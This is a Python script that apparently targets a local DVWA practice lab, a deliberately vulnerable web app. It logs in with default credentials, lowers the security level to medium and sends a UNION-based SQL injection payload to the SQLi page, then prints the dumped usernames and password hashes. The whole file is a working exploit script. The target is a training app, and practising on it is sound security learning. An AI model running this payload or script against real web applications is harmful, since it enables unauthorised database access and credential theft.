#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

s = requests.Session()

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url,params)
    print('[+] Logged In.')
dvwa_login()

def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'medium','seclev_submit':'Submit'}
    r = s.post(url,params)
    print('[+] Security set to medium.')
dvwa_security()

def sqli_medium():
    print('[~] Credentials dump can be seen below:\n')
    url = 'http://192.168.210.130/dvwa/vulnerabilities/sqli/'
    payload = "1 union select 1,(Select group_concat(0x3c62723e,user,0x3a3a,password,0x3c62723e) from users)-- -"
    param = {'id':payload,'Submit':'Submit'}
    r = s.get(url,params=param)
    html = r.text
    soup = BeautifulSoup(html,'lxml')
    text = soup.find_all('pre')[1]
    for data in text:
        if '::' in data:
            print(data)
sqli_medium()
